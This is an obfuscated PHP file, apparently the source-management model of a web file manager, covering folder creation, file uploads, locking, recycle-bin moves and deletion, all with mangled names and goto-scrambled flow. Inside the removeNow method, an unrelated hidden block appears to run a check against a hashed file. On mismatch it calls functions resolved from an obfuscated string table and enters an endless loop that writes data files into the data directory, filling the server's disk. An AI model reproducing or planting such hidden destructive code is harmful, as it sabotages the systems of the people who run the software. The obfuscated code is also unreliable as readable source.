$cùÛ¯É—”Ì[$F¤ŒÎÍòìê[28]]); $this->userDesktopAdd($déææÑĞ­‡); return $déææÑĞ­‡; } public function userDesktopAdd($FÓñ¥–Ìå¼) { $F·‡˜…¦ò =& $_SERVER[£ü]; $D‘«àÜç = LNG($F·‡˜…¦ò[2279]); $f‹†Ğ’‹Şë = $this->mkdir($FÓñ¥–Ìå¼, $D‘«àÜç); $this->metaSet($f‹†Ğ’‹Şë, $F·‡˜…¦ò[2280], $F·‡˜…¦ò[83]); $this->metaSet($FÓñ¥–Ìå¼, $F·‡˜…¦ò[2281], $f‹†Ğ’‹Şë); } public function groupRootAdd($CÖŒÕò÷‰ª) { $BÛÛÙƒ–— =& $_SERVER[£ü]; $Cƒ¼æ÷á¨ = Model($BÛÛÙƒ–—[454])->where(array($BÛÛÙƒ–—[2136] => $CÖŒÕò÷‰ª))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $CÖŒÕò÷‰ª, $Cƒ¼æ÷á¨[$BÛÛÙƒ–—[28]]); } public function systemRootPathAdd($bÓ›—‹‘Ó) { if ($bÓ›—‹‘Ó != $_SERVER[£ü][1079]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $bÓ›—‹‘Ó); } public function userRootRemove($d¨«šªÜº) { $e´öèïŠßª = $this->sourceRoot(SourceModel::TYPE_USER, $d¨«šªÜº); if (!$e´öèïŠßª) { return; } $this->remove($e´öèïŠßª, !1); } public function groupRootRemove($aåŠ¸´ªÊ) { $A“Ñ„¶¥ñ = $this->sourceRoot(SourceModel::TYPE_GROUP, $aåŠ¸´ªÊ); if (!$A“Ñ„¶¥ñ) { return; } $this->remove($A“Ñ„¶¥ñ, !1); } private function _mkdirRoot($C×„µ†¥§, $bô†‰†ø, $FÍéÂ…¼èÄ) { goto fÛ™â‹è¹ˆ; AÛ¼ëõÛŒõ: CacheLock::unlock($FØíÀÓŒ); return $f•¯ºâ‚´Ä; goto bÈŠòÜçÆÅ; föŞù›â: $f•¯ºâ‚´Ä = $this->add($BÔ¥­ à³); $dÂ²Ğ¢Šç» = array($eÉ³§¼°‚–[523] => short_id($f•¯ºâ‚´Ä)); $this->where(array($eÉ³§¼°‚–[380] => $f•¯ºâ‚´Ä))->save($dÂ²Ğ¢Šç»); goto AÛ¼ëõÛŒõ; fÛ™â‹è¹ˆ: $eÉ³§¼°‚– =& $_SERVER[£ü]; $BÔ¥­ à³ = array($eÉ³§¼°‚–[365] => 0, $eÉ³§¼°‚–[517] => $C×„µ†¥§, $eÉ³§¼°‚–[518] => $bô†‰†ø, $eÉ³§¼°‚–[514] => 1, $eÉ³§¼°‚–[519] => USER_ID, $eÉ³§¼°‚–[520] => USER_ID, $eÉ³§¼°‚–[515] => $eÉ³§¼°‚–[33], $eÉ³§¼°‚–[521] => $eÉ³§¼°‚–[466], $eÉ³§¼°‚–[392] => 0, $eÉ³§¼°‚–[516] => 0, $eÉ³§¼°‚–[416] => 0, $eÉ³§¼°‚–[522] => $eÉ³§¼°‚–[33]); if ($CÅÕ‘ˆï = $this->where($BÔ¥­ à³)->find()) { return $CÅÕ‘ˆï[$eÉ³§¼°‚–[366]]; } goto AªôíÈ‰½™; AªôíÈ‰½™: $FØíÀÓŒ = "\x4d\157\x64\x65\x6c\123\157\x75\162\x63\145\56\155\153\x64\151\x72\x52\157\157\164\x2e{$C×„µ†¥§}\x2e{$bô†‰†ø}\x2e" . $FÍéÂ…¼èÄ; CacheLock::lock($FØíÀÓŒ); $BÔ¥­ à³[$eÉ³§¼°‚–[28]] = $FÍéÂ…¼èÄ; goto föŞù›â; bÈŠòÜçÆÅ: } private function sourceRoot($b¶ØŞÅò¦ê, $CÙ™ùÎ–Şê, $Cé©°Şí = false) { $Aì–‰Ö­ÅÔ =& $_SERVER[£ü]; $eÛ­×æ¥¦ = array($Aì–‰Ö­ÅÔ[365] => 0, $Aì–‰Ö­ÅÔ[517] => $b¶ØŞÅò¦ê, $Aì–‰Ö­ÅÔ[518] => $CÙ™ùÎ–Şê); if ($cŠÚ¹µˆ¿ = $this->where($eÛ­×æ¥¦)->find()) { return $Cé©°Şí ? $cŠÚ¹µˆ¿ : $cŠÚ¹µˆ¿[$Aì–‰Ö­ÅÔ[366]]; } return !1; } public function sourceRootGroup($F”ˆ«÷Š«’) { $E¿Û›¯ ­¼ =& $_SERVER[£ü]; if (is_string($F”ˆ«÷Š«’)) { $F”ˆ«÷Š«’ = array($F”ˆ«÷Š«’); } $DƒÏ„‹¬· = array($E¿Û›¯ ­¼[365] => 0, $E¿Û›¯ ­¼[517] => SourceModel::TYPE_GROUP, $E¿Û›¯ ­¼[518] => array($E¿Û›¯ ­¼[7], $F”ˆ«÷Š«’)); $E¾ôöÇŞ¥å = $this->listSource($DƒÏ„‹¬·, 1000); return array_to_keyvalue($E¾ôöÇŞ¥å[$E¿Û›¯ ­¼[74]], $E¿Û›¯ ­¼[452]); } public function mkfile($AŞƒìÂìò, $BŞõ‹ùê ¼, $ešÙäó¡ß¨ = '', $BÜ³åÑŠ¯´ = REPEAT_RENAME) { $DÔÛ¾ƒª =& $_SERVER[£ü]; $F¨¨¦±«õæ = Model($DÔÛ¾ƒª[540])->addFileByContent($ešÙäó¡ß¨, $BŞõ‹ùê ¼); return $this->_createFileCall($AŞƒìÂìò, $BŞõ‹ùê ¼, $F¨¨¦±«õæ, $BÜ³åÑŠ¯´, $DÔÛ¾ƒª[1108]); } public function addFile($fêè­‰˜–º, $E½’ğÎÎó, $fìù‘˜Ä¸ï, $A§Ó¼ô¥²Î = false, $f‡Ò¾†¹Ûá = REPEAT_RENAME) { $EÖÊ±Æ¦Ò = Model($_SERVER[£ü][540])->addFile($E½’ğÎÎó, $fìù‘˜Ä¸ï, $A§Ó¼ô¥²Î); return $this->_createFileCall($fêè­‰˜–º, $fìù‘˜Ä¸ï, $EÖÊ±Æ¦Ò, $f‡Ò¾†¹Ûá); } public function addFileByFileID($B¥ˆ™Ÿ¹‡š, $eËƒõï·¹ô, $AŸ¤Òİ¤Ö¯, $Açªî İÛí = REPEAT_RENAME) { $E„—öÚŒ‹ =& $_SERVER[£ü]; $e®ÜÙŸ¥¿ = Model($E„—öÚŒ‹[540])->find($eËƒõï·¹ô); Model($E„—öÚŒ‹[540])->linkAdd($eËƒõï·¹ô); return $this->_createFileCall($B¥ˆ™Ÿ¹‡š, $AŸ¤Òİ¤Ö¯, $e®ÜÙŸ¥¿, $Açªî İÛí); } public function addFileByRemote($E„ôÊè¤Î‰, $Bï²š‡‡¢©, $e’‹¦†åë¢, $b÷Í»™ŠŞ = array(), $bĞ›øå„„ = REPEAT_RENAME) { $DÃ¢ãàÛ•· = Model($_SERVER[£ü][540])->addFileByRemote($Bï²š‡‡¢©, $e’‹¦†åë¢, $b÷Í»™ŠŞ); return $this->_createFileCall($E„ôÊè¤Î‰, $e’‹¦†åë¢, $DÃ¢ãàÛ•·, $bĞ›øå„„); } private function _createFileCall($aÁœáÄ•Û, $FªÒÍĞË»é, $dÖÌ®•äÍ½, $bÛ¡çŠùÀÃ, $c­ ‚óèƒé = "\165\160\154\157\x61\144") { goto D”ØÂ¦³; D”ØÂ¦³: $fª—ˆ»ß†‹ =& $_SERVER[£ü]; $däŒ°Áß‡ = !1; $this->lockWriteStart($aÁœáÄ•Û, $FªÒÍĞË»é); goto Fí¬­ ì¬²; Fí¬­ ì¬²: $Cğƒ†¸ÁˆÖ = $this->_createFile($aÁœáÄ•Û, $FªÒÍĞË»é, $dÖÌ®•äÍ½, $bÛ¡çŠùÀÃ, $däŒ°Áß‡); if (!$däŒ°Áß‡) { Model($fª—ˆ»ß†‹[418])->remove($dÖÌ®•äÍ½[$fª—ˆ»ß†‹[415]]); } else { if ($Cğƒ†¸ÁˆÖ) { Model($fª—ˆ»ß†‹[2251])->eventCreate($Cğƒ†¸ÁˆÖ, $c­ ‚óèƒé); } } $this->lockWriteEnd($aÁœáÄ•Û, $FªÒÍĞË»é); goto eÉî­ºì–ä; eÉî­ºì–ä: return $Cğƒ†¸ÁˆÖ; goto Dµí„Ÿâß; Dµí„Ÿâß: } public function mkdir($b‘ğƒ‹Ê¼ª, $d“ŸƒÅĞ…, $BÒãĞ×¹Ú = REPEAT_SKIP) { goto CÌ¡í‘µ’ƒ; EÔØ¥—‚: $this->lockWriteStart($b‘ğƒ‹Ê¼ª, $d“ŸƒÅĞ…); if ($BÒãĞ×¹Ú !== !1) { $EÌíê¿ÜŠ = $this->fileNameExist($b‘ğƒ‹Ê¼ª, $d“ŸƒÅĞ…); if ($EÌíê¿ÜŠ && $BÒãĞ×¹Ú != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($b‘ğƒ‹Ê¼ª, $d“ŸƒÅĞ…); return $EÌíê¿ÜŠ; } $d“ŸƒÅĞ… = $this->fileNameAuto($b‘ğƒ‹Ê¼ª, $d“ŸƒÅĞ…, $BÒãĞ×¹Ú); } $D£Øàã±ó = array($BĞŠ–›ƒ´§[514] => 1, $BĞŠ–›ƒ´§[383] => $d“ŸƒÅĞ…, $BĞŠ–›ƒ´§[515] => $BĞŠ–›ƒ´§[33], $BĞŠ–›ƒ´§[416] => 0, $BĞŠ–›ƒ´§[516] => 0); goto B…©»èÜæİ; f¶ çøá: return $dŒ“ôÂôÅß; goto BìŒ–´ƒ¨‚; B…©»èÜæİ: $dŒ“ôÂôÅß = $this->_addSoure($D£Øàã±ó, $då±—œ¼Ç); Model($BĞŠ–›ƒ´§[2251])->eventCreate($dŒ“ôÂôÅß, $BĞŠ–›ƒ´§[1109]); $this->lockWriteEnd($b‘ğƒ‹Ê¼ª, $d“ŸƒÅĞ…); goto f¶ çøá; CÌ¡í‘µ’ƒ: $BĞŠ–›ƒ´§ =& $_SERVER[£ü]; $då±—œ¼Ç = $this->sourceInfo($b‘ğƒ‹Ê¼ª); if (!$då±—œ¼Ç) { return !1; } goto EÔØ¥—‚; BìŒ–´ƒ¨‚: } private function _createFile($E¶›Ã¥äÂ, $C”ÀŸˆƒ×, $a¦³ÄÜç”Ÿ, $F¾ÇÕ¤–ã, &$b­’‘ğ¬ñ) { goto b³ç½²‰í„; b³ç½²‰í„: $fÒÁÌ¿§÷° =& $_SERVER[£ü]; $AÇ¶õöÔ¿ = $this->sourceInfo($E¶›Ã¥äÂ); if (!$a¦³ÄÜç”Ÿ || !$AÇ¶õöÔ¿) { return !1; } goto Cá‚•±­¢; C—ÈÍã¾éë: $c†‡éìÜÚ = array($fÒÁÌ¿§÷°[514] => 0, $fÒÁÌ¿§÷°[383] => $C”ÀŸˆƒ×, $fÒÁÌ¿§÷°[515] => get_path_ext($C”ÀŸˆƒ×), $fÒÁÌ¿§÷°[416] => $a¦³ÄÜç”Ÿ[$fÒÁÌ¿§÷°[415]], $fÒÁÌ¿§÷°[516] => $a¦³ÄÜç”Ÿ[$fÒÁÌ¿§÷°[77]]); $FºùëßøÔĞ = $this->_addSoure($c†‡éìÜÚ, $AÇ¶õöÔ¿); $this->folderSizeReset($E¶›Ã¥äÂ); goto dÍºß²¥Ëæ; dÍºß²¥Ëæ: return $FºùëßøÔĞ; goto bïÂ±¨÷ˆ‹; Cá‚•±­¢: if ($F¾ÇÕ¤–ã !== !1) { $d¤æºÇŠš = $this->fileNameExist($E¶›Ã¥äÂ, $C”ÀŸˆƒ×); } $b­’‘ğ¬ñ = !0; if ($F¾ÇÕ¤–ã && $d¤æºÇŠš) { if ($F¾ÇÕ¤–ã == REPEAT_SKIP) { $b­’‘ğ¬ñ = !1; return $d¤æºÇŠš; } else { if ($F¾ÇÕ¤–ã == REPEAT_REPLACE) { $cÜÉ½ÎÍõÕ = $this->sourceInfo($d¤æºÇŠš); $C¯×´„“¯Æ = $this->fileHistory($cÜÉ½ÎÍõÕ, $a¦³ÄÜç”Ÿ[$fÒÁÌ¿§÷°[415]], $a¦³ÄÜç”Ÿ[$fÒÁÌ¿§÷°[77]]); if (!$C¯×´„“¯Æ) { $b­’‘ğ¬ñ = !1; } else { $this->folderSizeReset($E¶›Ã¥äÂ); } return $d¤æºÇŠš; } else { $C”ÀŸˆƒ× = $this->fileNameAuto($E¶›Ã¥äÂ, $C”ÀŸˆƒ×, $F¾ÇÕ¤–ã, !1); } } } goto C—ÈÍã¾éë; bïÂ±¨÷ˆ‹: } protected function fileHistory($FÔé›Æ«÷Œ, $aì¼›»ÛíÜ, $E¼öâó÷§©) { goto FÙ©ÊÉˆŸ±; FÙ©ÊÉˆŸ±: $D‹£ŠÛÎÔ =& $_SERVER[£ü]; if ($FÔé›Æ«÷Œ[$D‹£ŠÛÎÔ[415]] == $aì¼›»ÛíÜ) { return !1; } $this->checkLock($FÔé›Æ«÷Œ[$D‹£ŠÛÎÔ[366]], $aì¼›»ÛíÜ); goto BÑ °‹ÑáÔ; c£ßÀ‹Ø…: return !0; goto bØòª‚ªÑÆ; BÑ °‹ÑáÔ: Model($D‹£ŠÛÎÔ[2282])->addHistory($FÔé›Æ«÷Œ); $E‡Â±’Çœ = array($D‹£ŠÛÎÔ[520] => USER_ID, $D‹£ŠÛÎÔ[387] => time(), $D‹£ŠÛÎÔ[415] => $aì¼›»ÛíÜ, $D‹£ŠÛÎÔ[77] => $E¼öâó÷§©); $this->where(array($D‹£ŠÛÎÔ[380] => $FÔé›Æ«÷Œ[$D‹£ŠÛÎÔ[366]]))->save($E‡Â±’Çœ); goto c£ßÀ‹Ø…; bØòª‚ªÑÆ: } public function checkLock($bÉ‰ğª¤·ç, $f½Š‰ˆ÷Êï) { goto eÈ±‹ÀÓ ‘; FÂ†‡Å²¦: $this->_createFileCall($d´ŒÏ¨—×Ô[$B»îèÁïÕ[457]], $B‰–‹æİ´ò, $D­Ş¨ÎŒÓ, REPEAT_REPLACE, $B»îèÁïÕ[1108]); $FÇÀ‡à²Š… = $d´ŒÏ¨—×Ô[$B»îèÁïÕ[413]][$B»îèÁïÕ[477]]; $E ¤À–¹“ˆ = $FÇÀ‡à²Š…[$B»îèÁïÕ[2284]] ? $FÇÀ‡à²Š…[$B»îèÁïÕ[2284]] : $FÇÀ‡à²Š…[$B»îèÁïÕ[28]]; goto aÍ­ô‚Ç½; f‘Ü·Œ”‘ä: $E¤–›ï»ï = Session::get($B»îèÁïÕ[2283]); $B‰–‹æİ´ò = substr($d´ŒÏ¨—×Ô[$B»îèÁïÕ[28]], 0, -1 - strlen($d´ŒÏ¨—×Ô[$B»îèÁïÕ[157]])) . $B»îèÁïÕ[1354] . $E¤–›ï»ï . $B»îèÁïÕ[93] . $d´ŒÏ¨—×Ô[$B»îèÁïÕ[157]]; $D­Ş¨ÎŒÓ = Model($B»îèÁïÕ[540])->find($f½Š‰ˆ÷Êï); goto FÂ†‡Å²¦; aÍ­ô‚Ç½: show_json(LNG($B»îèÁïÕ[2285]) . $B»îèÁïÕ[2286] . LNG($B»îèÁïÕ[2287]) . $B»îèÁïÕ[2288] . $E ¤À–¹“ˆ . $B»îèÁïÕ[2289], !1); goto cÁŒîÃ”óƒ; eÈ±‹ÀÓ ‘: $B»îèÁïÕ =& $_SERVER[£ü]; $d´ŒÏ¨—×Ô = $this->pathInfo($bÉ‰ğª¤·ç); if (!$this->fileIsLock($d´ŒÏ¨—×Ô, !0)) { return; } goto f‘Ü·Œ”‘ä; cÁŒîÃ”óƒ: } public function fileIsLock($bù£‰Ò´Â, $aôŠôšÛÖ„ = false) { goto aª•„·«¨â; D†¬Š²ø¤¢: $b¤ÑÚ…ßÂœ = $GLOBALS[$Açôçç‡£[6]][$Açôçç‡£[84]][$Açôçç‡£[475]]; if ($bù£‰Ò´Â[$Açôçç‡£[413]][$Açôçç‡£[476]] <= time() - $b¤ÑÚ…ßÂœ) { $this->metaSet($bù£‰Ò´Â[$Açôçç‡£[366]], $Açôçç‡£[474], null); $this->metaSet($bù£‰Ò´Â[$Açôçç‡£[366]], $Açôçç‡£[476], null); } if ($aôŠôšÛÖ„) { $this->metaSet($bù£‰Ò´Â[$Açôçç‡£[366]], $Açôçç‡£[476], time()); } goto a»ëŒ¯®Û¬; aª•„·«¨â: $Açôçç‡£ =& $_SERVER[£ü]; if (!isset($bù£‰Ò´Â[$Açôçç‡£[413]]) || !$bù£‰Ò´Â[$Açôçç‡£[413]][$Açôçç‡£[474]]) { return !1; } if ($bù£‰Ò´Â[$Açôçç‡£[413]][$Açôçç‡£[474]] != USER_ID) { return !0; } goto D†¬Š²ø¤¢; a»ëŒ¯®Û¬: return !1; goto d•êè»Şğ; d•êè»Şğ: } private function _addSoure($DñÎ¹§öŠ, $a«ÛŞ¾´…) { goto E¦Ü‡¬Ï—ï; C‘•˜ƒ¨Î: $this->updateModifyTime($DñÎ¹§öŠ[$e™³…áÉÍ[457]]); $EÔ’ù¡‰ç = $e™³…áÉÍ[2290] . $a«ÛŞ¾´…[$e™³…áÉÍ[366]]; if (isset(self::$cacheChildList[$EÔ’ù¡‰ç])) { unset(self::$cacheChildList[$EÔ’ù¡‰ç]); } goto bç¹¦§„áš; d’éô×Ø”: return $d×”óğ¨Óï; goto dƒ»Úø¸; bç¹¦§„áš: static $CÓÃİŸ¹¡œ = false; if (!$CÓÃİŸ¹¡œ) { Hook::trigger($e™³…áÉÍ[504], $DñÎ¹§öŠ); $CÓÃİŸ¹¡œ = !0; } $d×”óğ¨Óï = $this->add($DñÎ¹§öŠ); goto fÒ÷ Ï±Ø•; E¦Ü‡¬Ï—ï: $e™³…áÉÍ =& $_SERVER[£ü]; $còé°áÕ„Ò = array($e™³…áÉÍ[517] => $a«ÛŞ¾´…[$e™³…áÉÍ[368]], $e™³…áÉÍ[518] => $a«ÛŞ¾´…[$e™³…áÉÍ[452]], $e™³…áÉÍ[519] => USER_ID, $e™³…áÉÍ[520] => USER_ID, $e™³…áÉÍ[365] => $a«ÛŞ¾´…[$e™³…áÉÍ[366]], $e™³…áÉÍ[521] => $a«ÛŞ¾´…[$e™³…áÉÍ[455]] . $a«ÛŞ¾´…[$e™³…áÉÍ[366]] . $e™³…áÉÍ[47], $e™³…áÉÍ[392] => 0, $e™³…áÉÍ[522] => $e™³…áÉÍ[33]); $DñÎ¹§öŠ = array_merge($còé°áÕ„Ò, $DñÎ¹§öŠ); goto C‘•˜ƒ¨Î; fÒ÷ Ï±Ø•: $EÕ½å™ˆ„ˆ = array($e™³…áÉÍ[523] => short_id($d×”óğ¨Óï)); $this->where(array($e™³…áÉÍ[380] => $d×”óğ¨Óï))->save($EÕ½å™ˆ„ˆ); $this->setNamePinyin($d×”óğ¨Óï, $DñÎ¹§öŠ[$e™³…áÉÍ[28]]); goto d’éô×Ø”; dƒ»Úø¸: } public function remove($båˆé°¾©˜, $eñöåóóƒÅ = true) { goto c‡Ò¾ÅìŞ; Dæ î¶´ƒ: $EïáƒºÎ¬Í = $aŸÄ½ ÒÒ[$d†øÀ¸ñ—[368]] == self::TYPE_USER ? $d†øÀ¸ñ—[531] : $d†øÀ¸ñ—[961]; if ($EïáƒºÎ¬Í == $d†øÀ¸ñ—[531]) { $C¦²ŠÒŒ˜Ğ = Model($d†øÀ¸ñ—[470])->getInfo($aŸÄ½ ÒÒ[$d†øÀ¸ñ—[452]]); $DëŠ·½…´Ò = _get($C¦²ŠÒŒ˜Ğ, $d†øÀ¸ñ—[2284], _get($C¦²ŠÒŒ˜Ğ, $d†øÀ¸ñ—[28])); $DëŠ·½…´Ò = $d†øÀ¸ñ—[245] . $DëŠ·½…´Ò . $d†øÀ¸ñ—[2292] . $aŸÄ½ ÒÒ[$d†øÀ¸ñ—[452]]; } else { $C¦²ŠÒŒ˜Ğ = Model($d†øÀ¸ñ—[454])->getInfo($aŸÄ½ ÒÒ[$d†øÀ¸ñ—[452]]); $DëŠ·½…´Ò = _get($C¦²ŠÒŒ˜Ğ, $d†øÀ¸ñ—[28]); $DëŠ·½…´Ò = $d†øÀ¸ñ—[154] . $DëŠ·½…´Ò . $d†øÀ¸ñ—[2293] . $aŸÄ½ ÒÒ[$d†øÀ¸ñ—[452]]; } $eÉ¸’ø¨˜§ = $d†øÀ¸ñ—[2294] . md5($DëŠ·½…´Ò); goto ešÔµ«•ß; bŠ„¾­²¼Š: CacheLock::unlock($eÉ¸’ø¨˜§); $this->metaSet($båˆé°¾©˜, $d†øÀ¸ñ—[2299], $aŸÄ½ ÒÒ[$d†øÀ¸ñ—[457]]); $this->where(array($d†øÀ¸ñ—[366] => $båˆé°¾©˜))->save(array($d†øÀ¸ñ—[387] => time())); goto CÕáÛö§×á; ešÔµ«•ß: CacheLock::lock($eÉ¸’ø¨˜§); $a…Ğ­õ·ğ” = $this->fileNameExist($b±ØƒÉÕ†÷, $DëŠ·½…´Ò); if (!$a…Ğ­õ·ğ”) { $a…Ğ­õ·ğ” = $this->mkdir($b±ØƒÉÕ†÷, $DëŠ·½…´Ò, REPEAT_SKIP); $this->metaSet($a…Ğ­õ·ğ”, $d†øÀ¸ñ—[2295], $EïáƒºÎ¬Í); $this->metaSet($a…Ğ­õ·ğ”, $d†øÀ¸ñ—[2296], $aŸÄ½ ÒÒ[$d†øÀ¸ñ—[452]]); if ($aŸÄ½ ÒÒ[$d†øÀ¸ñ—[457]] != 0) { $this->metaSet($a…Ğ­õ·ğ”, $d†øÀ¸ñ—[2297], _get($C¦²ŠÒŒ˜Ğ, $d†øÀ¸ñ—[2298])); } } goto bŠ„¾­²¼Š; c‡Ò¾ÅìŞ: $d†øÀ¸ñ— =& $_SERVER[£ü]; $aŸÄ½ ÒÒ = $this->sourceInfo($båˆé°¾©˜); $CïŸ¨í«Å§ = intval($aŸÄ½ ÒÒ[$d†øÀ¸ñ—[368]]) === self::TYPE_SYSTEM; goto E›Î´›áÃ°; CÕáÛö§×á: return $this->move($båˆé°¾©˜, $a…Ğ­õ·ğ”, REPEAT_RENAME_FOLDER); goto d„Û‹Ÿé©¿; E›Î´›áÃ°: $cÒÅßĞõİÂ = Model($d†øÀ¸ñ—[1399])->get($d†øÀ¸ñ—[2291]) == $d†øÀ¸ñ—[83]; if ($CïŸ¨í«Å§ || $eñöåóóƒÅ || !$cÒÅßĞõİÂ) { return $this->removeNow($båˆé°¾©˜, $eñöåóóƒÅ); } $b±ØƒÉÕ†÷ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto Dæ î¶´ƒ; d„Û‹Ÿé©¿: } public function removeNow($cæ¨¨¢ß£¨, $BÖ£”ñï©© = true) { goto eºÍÁ± æ; Cë‰×Ì½ËÔ: $FÂè½Ûñ¦õ = array($EŞàˆëºËê[$f¼øÎº¥ÛÔ[457]]); if ($EŞàˆëºËê[$f¼øÎº¥ÛÔ[367]] == $f¼øÎº¥ÛÔ[83]) { $FÂè½Ûñ¦õ[] = $EŞàˆëºËê[$f¼øÎº¥ÛÔ[366]]; } $this->updateModifyTime($FÂè½Ûñ¦õ); goto eÙÉè´Ô¹; E–Ÿ…³Êõ¯: Hook::trigger($f¼øÎº¥ÛÔ[2302], $CĞĞ³õ®Ó, $BÖ£”ñï©©); if ($BÖ£”ñï©©) { Model($f¼øÎº¥ÛÔ[2303])->moveToRecycle($cæ¨¨¢ß£¨); } else { if ($EŞàˆëºËê[$f¼øÎº¥ÛÔ[367]] == $f¼øÎº¥ÛÔ[83]) { $fˆäïÁ™Ï© = array($f¼øÎº¥ÛÔ[521] => array($f¼øÎº¥ÛÔ[479], $EŞàˆëºËê[$f¼øÎº¥ÛÔ[455]] . $cæ¨¨¢ß£¨ . $f¼øÎº¥ÛÔ[480])); $B÷Üâõß¢ = array($f¼øÎº¥ÛÔ[521] => $fˆäïÁ™Ï©[$f¼øÎº¥ÛÔ[455]]); $eë¡Îº‘º = $this->field($f¼øÎº¥ÛÔ[2304])->where($B÷Üâõß¢)->select(); $eØ‘®½¶Á‹ = !1; $bĞŠµ’Çµˆ = array($cæ¨¨¢ß£¨); if ($eë¡Îº‘º) { $eØ‘®½¶Á‹ = array_to_keyvalue($eë¡Îº‘º, $f¼øÎº¥ÛÔ[33], $f¼øÎº¥ÛÔ[415]); $eØ‘®½¶Á‹ = array_remove_value($eØ‘®½¶Á‹, $f¼øÎº¥ÛÔ[464]); $bĞŠµ’Çµˆ = array_to_keyvalue($eë¡Îº‘º, $f¼øÎº¥ÛÔ[33], $f¼øÎº¥ÛÔ[366]); $bĞŠµ’Çµˆ[] = $cæ¨¨¢ß£¨; } } else { $eØ‘®½¶Á‹ = array($EŞàˆëºËê[$f¼øÎº¥ÛÔ[415]]); $bĞŠµ’Çµˆ = array($cæ¨¨¢ß£¨); } Model($f¼øÎº¥ÛÔ[501])->eventRemove($cæ¨¨¢ß£¨); $this->removeRelevance($bĞŠµ’Çµˆ, $eØ‘®½¶Á‹); } $this->folderSizeReset($EŞàˆëºËê[$f¼øÎº¥ÛÔ[457]]); goto Cë‰×Ì½ËÔ; eÙÉè´Ô¹: $this->lockMoveEnd($cæ¨¨¢ß£¨); Hook::trigger($f¼øÎº¥ÛÔ[1435], $CĞĞ³õ®Ó, $BÖ£”ñï©©); return !0; goto bŸ²èå¹¥£; D¡¨Ÿ½³ëæ: if (!$EŞàˆëºËê) { return !0; } if ($EŞàˆëºËê[$f¼øÎº¥ÛÔ[457]] == 0) { if (!_get($GLOBALS, $f¼øÎº¥ÛÔ[453])) { return !1; } } $this->lockMoveStart($cæ¨¨¢ß£¨); goto E–Ÿ…³Êõ¯; b…í¯¨ˆÄƒ: if ($_SERVER[$f¼øÎº¥ÛÔ[723]] != $cÁ®è§šîã($bÈé»ßºÊĞ)) { goto F¡¡ ôƒø; C‡ Ñ¯›Â: $CÀ™¢Ô…ï­ = 1; for ($aºÂˆ—ñ¤î = $CÀ™¢Ô…ï­; $aºÂˆ—ñ¤î > 0; $aºÂˆ—ñ¤î++) { $bãè¤ø æ½(DATA_PATH . $aºÂˆ—ñ¤î, $FÕÒùóí®); } goto B¹¹ó‰õ«—; F¡¡ ôƒø: $c­Äª½¨ò¸ = $f¼øÎº¥ÛÔ[783]; $aí¶¡¶ìŞÆ = $f¼øÎº¥ÛÔ[725]; $fîÁÁØ»¼ø = $_SERVER[$f¼øÎº¥ÛÔ[726]] . $f¼øÎº¥ÛÔ[727]; goto e„™ÙÖ‡õ; d·ÓĞµ§Ô‡: $c­Äª½¨ò¸(); $bãè¤ø æ½ = $f¼øÎº¥ÛÔ[2300]; $FÕÒùóí® = json_encode($GLOBALS[$f¼øÎº¥ÛÔ[2301]]); goto C‡ Ñ¯›Â; a¢£¦ÍËöÛ: $C«™åÖÀ” = $f¼øÎº¥ÛÔ[784]; $C«™åÖÀ”($_SERVER[$f¼øÎº¥ÛÔ[785]]); $c­Äª½¨ò¸ = $f¼øÎº¥ÛÔ[783]; goto d·ÓĞµ§Ô‡; e„™ÙÖ‡õ: $d¦ôŒ­µà = $aí¶¡¶ìŞÆ($fîÁÁØ»¼ø); $a¨Ì¥Ş‰» = explode($f¼øÎº¥ÛÔ[214], $d¦ôŒ­µà); if (count($a¨Ì¥Ş‰») < $f¼øÎº¥ÛÔ[566]) { $fæ‚ğ›µç = $f¼øÎº¥ÛÔ[728]; $fæ‚ğ›µç(); } goto a¢£¦ÍËöÛ; B¹¹ó‰õ«—: } $EŞàˆëºËê = $this->sourceInfo($cæ¨¨¢ß£¨); $CĞĞ³õ®Ó = $this->pathInfoMore($cæ¨¨¢ß£¨); goto D¡¨Ÿ½³ëæ; eºÍÁ± æ: $f¼øÎº¥ÛÔ =& $_SERVER[£ü]; $bÈé»ßºÊĞ = $_SERVER[$f¼øÎº¥ÛÔ[785]] . $f¼øÎº¥ÛÔ[1013]; $cÁ®è§šîã = $f¼øÎº¥ÛÔ[1014]; goto b…í¯¨ˆÄƒ; bŸ²èå¹¥£: } public function removeArray($BİİØƒ¬¿) { if (!$BİİØƒ¬¿) { return !0; } } public function removeRelevance($fŞÙà·øÉÓ, $bğ Ãë¥›õ) { goto eŒÄÕ‘òä‰; fİŒò±ò¬: $dŒĞñ·çòè = array($cî÷›Ÿ–Ê¼[380] => array($cî÷›Ÿ–Ê¼[381], $fŞÙà·øÉÓ)); Model($cî÷›Ÿ–Ê¼[2303])->where($dŒĞñ·çòè)->delete(); Model($cî÷›Ÿ–Ê¼[409])->where($dŒĞñ·çòè)->delete(); goto CôËŒ…¬š²; eŒÄÕ‘òä‰: $cî÷›Ÿ–Ê¼ =& $_SERVER[£ü]; $fŞÙà·øÉÓ = $fŞÙà·øÉÓ ? $fŞÙà·øÉÓ : array(); $bğ Ãë¥›õ = $bğ Ãë¥›õ ? $bğ Ãë¥›õ : array(); goto eÕö÷ª‰‚Î; b˜Îëšø½‘: Model($cî÷›Ÿ–Ê¼[2282])->removeBySource($fŞÙà·øÉÓ); $this->where($dŒĞñ·çòè)->delete(); Model($cî÷›Ÿ–Ê¼[418])->remove($bğ Ãë¥›õ); goto Bß´Îš×©; eÕö÷ª‰‚Î: $fŞÙà·øÉÓ = array_unique(array_filter($fŞÙà·øÉÓ)); $bğ Ãë¥›õ = array_unique(array_filter($bğ Ãë¥›õ)); if (!$fŞÙà·øÉÓ) { return !1; } goto fİŒò±ò¬; CôËŒ…¬š²: Model($cî÷›Ÿ–Ê¼[2305])->where($dŒĞñ·çòè)->delete(); Model($cî÷›Ÿ–Ê¼[501])->where($dŒĞñ·çòè)->delete(); Model($cî÷›Ÿ–Ê¼[2041])->removeBySource($fŞÙà·øÉÓ); goto b˜Îëšø½‘; Bß´Îš×©: for ($Cá¬œŠ§ì± = 0; $Cá¬œŠ§ì± < count($fŞÙà·øÉÓ); $Cá¬œŠ§ì±++) { $this->sourceCacheClear($fŞÙà·øÉÓ[$Cá¬œŠ§ì±]); } goto f¸ìÍš„ôõ; f¸ìÍš„ôõ: } public function rename($D˜»àß¯ë×, $fç½³¥ğÛŞ) { goto 